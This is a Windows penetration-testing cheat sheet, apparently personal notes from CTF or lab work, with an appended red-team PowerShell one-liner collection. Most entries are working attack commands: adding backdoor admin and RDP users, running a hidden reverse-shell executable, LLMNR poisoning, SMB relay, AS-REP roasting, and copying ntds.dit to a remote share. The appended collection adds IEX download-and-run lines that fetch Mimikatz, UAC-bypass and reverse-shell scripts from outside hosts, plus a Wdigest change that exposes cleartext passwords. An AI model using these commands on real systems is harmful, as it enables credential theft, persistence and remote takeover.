----------------------------------------------------autorum_commands_on_startup---------------------------------
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run


---------------------------------------------------Bypass-Windows-authentication-password---------------------
konboot

-------------------------------------------------------------Crack_LM/NT_hashes----------------------------------------------
john hashes.txt --incremental #format: <user>:<Hash>

ophcrack


-----------------------------------------------smb/netbios---------------------------
nbtstat -n  (local)

nbstat -a <IP>

--------------------------------------------------enviroment-variables------------------------
set
-----------------------------------------------systeminfo-----------------------------------
systeminfo
-----------------------------------------------list-all-drives------------------------------
wmic logicaldisk get caption,description,providername

----------------------------------------------search-files--------------------------------------

dir /s /b credentials.txt

------------------------------------------------routing table----------------------------------
route print

------------------------------------------------------Changing interface metric(priority of interface)----------------------------------------
get-wmiobject win32_networkadapter | select netconnectionid, name, InterfaceIndex, netconnectionstatus   (Finding interface index)
netsh interface ipv4 show interfaces (Finding interface index)

Set-NetIPInterface -InterfaceIndex 12 -InterfaceMetric 15   (changing the interface metric)


------------------------------import-module---------------------------------------------
import-module .\PowerView.ps1

C:\PSTools>dir C:\PSTools\ps*
C:\>dir C:\PSTools\ps*.exe

type seeme.txt
notepad.exe seeme.txt:hidden.txt
dir /?
dir /R

snow -C -m "Hidden Message" -p "password" snow.txt snow2.txt
snow -C -p "password" snow2.txt

------------------------------------------------list ports/services listening---------------------------------------
netstat
netstat -oa | findstr 127.0.0.1

powershell -Command "Start-Process cmd -Verb RunAs" #open cmd with admin privelliges
Start-Process powershell -Verb runAs

----------------------------------------------run exe in background---------------------------------
Start-Process "C:\Windows\Temp\shell_x86_rev_3333.exe" -WindowStyle Hidden   (Start process in background)

----------------------------------------------------------check enabled services---------------------------------------------
net start

wmic service where 'Caption like "Remote%" and started=true' get Caption

----------------------------------------------------------------add user as admin--------------------------------------------
1.net user /add test testertest
2.net localgroup administrators pswalia /add

-------------------------------------------------------------Enable administrator account windows-----------------------------
windows+r --> lusrmgr.msc

-------------------------------------------------------------check local administrators------------------------------------------------------------
net localgroup administrators

------------------------------------------------------------list groups------------------------------------------------------------------
net localgroup

net localgroup "Remote Desktop Users"

---------------------------------------------------------------change password of local windows user---------------------------------------------
net user <username> testertest
net user Administrator testertest@123
---------------------------------------------------------------check admin----------------------------------------------------
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

 whoami /priv

-------------------------------------------------------------------------copy/transfer files like wget------------------------------------
iwr -uri http://10.10.15.107:8080/winPEAS.exe -outfile winpeas.exe
Invoke-WebRequest http://10.10.14.2:8080/winPEASx64.exe -OutFile winPEASx64.exe

certutil.exe -urlcache -split -f http://10.0.0.5/40564.exe bad.exe

impacket-smbserver apnashare $(pwd)
net use z: \\10.10.14.8\apnashare 

----------------------------------------------------mount-shared-folders--------------------------------------------
add
vmhgfs-fuse /mnt/hgfs fuse defaults,allow_other 0 0

to /etc/fstab

Then reboot, or sudo mount -a

--------------------------------------------------------LLMNR poisoning Responder------------------------------------------
responder -I eth0 -rdwv
hashcat -m 5600 ntlmhash.txt /mnt/hgfs/D/wordlists/rockyou.txt --force

----------------------------------------------------------SMB Relay--------------------------------------------
nmap --script=smb2-security-mode.nse -p 445 192.168.211.0/24

subl /etc/responder/Responder.conf (turn off smb and http)

python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf /root/target.txt -smb2support


---------------------------------------------------------32bitpowershell-----------------------------------
C:\Windows\SysWOW64\WindowsPowerShell\v1.0

--------------------------------------------------------64bit_powershell------------------------------
C:\Windows\System32\WindowsPowerShell\v1.0

--------------------------------------------------------Determine-Powerhsell Architechture-----------------
 [Environment]::Is64bitProcess
 
-------------------------------------------------------secretsdump.py-----------------------------------------


---------------------------------grep altenative--------------------
adb shell pm list packages | findstr "insurance"


-------------------------------------------------------------recursively view files and folders----------------------------------

Get-ChildItem -recurse .

----------------------------------------------------------su to other user within shell (switching to other user)---------------------------------------------

$pass=ConvertTo-SecureString 'Zx^#QZX+T!123' -AsPlainText -Force
$cred=New-Object System.Management.Automation.PSCredential ("batman", $pass)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred


---------------------------------------------------------UAC bypass/ mount smb share-------------------------------------------------------------
net use z: \\10.10.14.5\apnashare /user:test <password>

net use Z: \\127.0.0.1\c$

cd z:

--------------------------------------------------------------Compress-archive---------------------------------
Compress-Archive -LiteralPath C:\users\lars\Documents\wcf -DestinationPath C:\users\lars\Documents\wcf.zip

----------------------------------------------------------------checking direcory permissions-------------------
icacls c:\windows\temp

-----------------------------------------------wsl linux dir location----------------------------
%USERPROFILE%\AppData\Local\Packages

---------------------------------------------------------null session----------------------------------
net use \\192.168.99.162\IPC$ "" /u:""

----------------------------------------------------------windows b64 convert------------------------------------

[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s))

-------------------------------------------------------Impacket----------------------------------------------

python3 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 (Finding user accounts which do not require Kerberos preauth)

python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request -format hashcat (Fetching TGT)

------------------------------------------------------------Connect to smb share------------------------------------------

$pass=ConvertTo-SecureString 'smb_password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PsCredential("<user_name>",$pass)
New-PSDrive -Name apnasmb -PSProvider FileSystem -Credential $cred -Root \\<ip>\<share>

----------------------------------------------------------------Finding Domain Controller---------------------------
ipconfig /displaydns
powershell "IEX (New-Object Net.WebClient).DownloadString('http://175.13.80.16:8000/PowerView.ps1'); Get-NetDomainController"

--------------------------------------------------------Bloodhound-----------------------------------------
runas /netonly /user:active.htb\SVC_TGS powershell(Running sharphound via remote pc using a pwned domain user)


-----------------------------------------------------Enable RDP-------------------------------------------

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow

--------------------------------------------------------Add user to rdp group--------------------------
net localgroup "Remote Desktop Users" evil_user /add 

------------------------------------------------Powershell--------------------------------------------
Get-ChildItem -Hidden -Directory -Filter '*3*' 

To get the exact position of a string within the file, you can use the following command:  
(Get-Content -Path file.txt)[index] 
Get-Content .\1.txt | Select-Object -Index 551

Get-Item -Path file.exe -Stream * (view Alternate data streams)

The command to run to launch the hidden executable hiding within ADS: wmic process call create $(Resolve-Path file.exe:streamname)

-----------------------------------------------netstat-----------------------------------
netstat -ano
-------------------------------------------------------wbadmin(backup & restore)------------------------------------------
echo Y | wbadmin start backup -include:C:\Windows\NTDS\ntds.dit -backuptarget:\\10.10.14.5\myshare

wbadmin get versions

echo Y | wbadmin start recovery -version:12/28/2020-10:40 -itemType:file -items:C:\windows\ntds\ntds.dit -BackupTarget:\\10.10.14.5\myshare -recoverytarget:c:\ -notrestoreacl

reg save hklm\system system.save

---------------------------------------------------------------system file to crack ntds.dit------------------------
reg save hklm\system system.save

---------------------------------------------------------------Powershell ping sweep-------------------------------------
1..255 | % {"192.168.1.$($_): $(Test-Connection -count 1 -comp 192.168.1.$($_) -quiet)"}

1..255 | % {echo "192.168.1.$_"; ping -n 1 -w 100 192.168.1.$_} | Select-String ttl

workflow ParallelSweep { foreach -parallel -throttlelimit 4 ($i in 1..255) {ping -n 1 -w 100 10.100.11.$i}}; ParallelSweep | Select-String ttl

-InformationLevel Quiet -WA SilentlyContinue -EA SilentlyContinue

---------------------------------------------------Powershell TCP connect portscan------------------------
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null

1..20 | % { $a = $_; write-host "------"; write-host "10.0.0.$a"; 22,53,80,445 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null}

-------------------------------------------------------RedTeam_CheatSheet.ps1--------------------------------------------
# Description: 
#    Collection of PowerShell one-liners for red teamers and penetration testers to use at various stages of testing.

# convert reverseshell to meterpreter
use unicorn
use web delivery module

# convert noninterative cmd reverse shell to powershell
powershell.exe -nop -ExecutionPolicy bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://[your attacking machine's IP address]:[port1]/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress [your attacking machine's IP address] -Port [port2]"

# Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command]
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"

# Invoke-Mimikatz: Dump credentials from memory
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

# Import Mimikatz Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"

# Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)]
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"

# PowerUp: Privilege escalation checks
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2:8080/PowerUp.ps1');Invoke-AllChecks"

# Invoke-Inveigh and log output to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y"

# Invoke-Kerberoast and provide Hashcat compatible hashes
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"

# Invoke-ShareFinder and print output to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"

# Import PowerView Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"

# Invoke-Bloodhound
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('http://10.10.14.7/SharpHound.ps1');Invoke-BloodHound -CollectionMethod All"

# Find GPP Passwords in SYSVOL
findstr /S cpassword $env:logonserver\sysvol\*.xml
findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)

# Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER]
runas /user:DOMAIN\USER /noprofile powershell.exe

# Insert reg key to enable Wdigest on newer versions of Windows
reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1